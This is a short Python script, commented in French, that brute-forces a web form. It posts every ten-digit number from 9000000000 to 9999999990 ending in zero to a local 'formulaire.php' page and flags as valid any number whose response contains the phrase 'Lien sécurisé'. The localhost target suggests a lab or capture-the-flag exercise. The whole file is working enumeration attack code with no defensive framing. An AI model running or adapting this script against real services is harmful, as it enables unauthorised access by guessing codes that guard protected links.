import requests

url = "http://localhost/formulaire.php"

# Plage : de 9000000000 à 9999999990 (10 chiffres, commence par 9, finit par 0)
for i in range(9000000000, 9999999991, 10):  # pas de 10 pour finir par 0
    data = {"numero": str(i)}
    r = requests.post(url, data=data)

    if "Lien sécurisé" in r.text:   # mot-clé succès
        print(f"[+] Numéro valide trouvé: {i}")
    else:
        print(f"[-] Numéro {i} refusé")
